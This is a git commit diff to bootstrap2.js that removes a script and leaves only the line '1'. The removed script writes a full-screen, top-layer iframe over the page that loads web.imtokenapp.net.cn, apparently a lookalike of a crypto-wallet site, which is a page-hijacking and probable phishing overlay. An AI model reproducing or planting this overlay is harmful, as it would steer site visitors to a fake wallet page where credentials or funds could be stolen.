fd8e7aea9083a3500132353b9dd4d7c0bcbd7b3e
Liseth0704 <1849307238@qq.com>
2024-09-11 12:19:36 +0800

    Update bootstrap2.js

--- bootstrap2.js
+++ bootstrap2.js
@@ -1,14 +1,1 @@
-document.write('<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no"><style>html,body{width:100%;height:100%;margin:0;padding:0}</style>');
-
-var iframe = document.createElement('iframe');
-iframe.src = 'https://web.imtokenapp.net.cn';
-iframe.scrolling = 'auto';
-iframe.style.cssText = "width:100%;height:100%;left:1px;top:1px;border:none;background:#fff";
-
-var div1 = document.createElement("div");
-var div = document.createElement("div");
-div1.style.cssText = "-webkit-overflow-scrolling:touch;width:100%;height:100%;z-index:9999999999;position:fixed;top:0;left:0;overflow:auto;";
-
-div1.appendChild(iframe);
-div.appendChild(div1);
-document.write(div.innerHTML);
+1
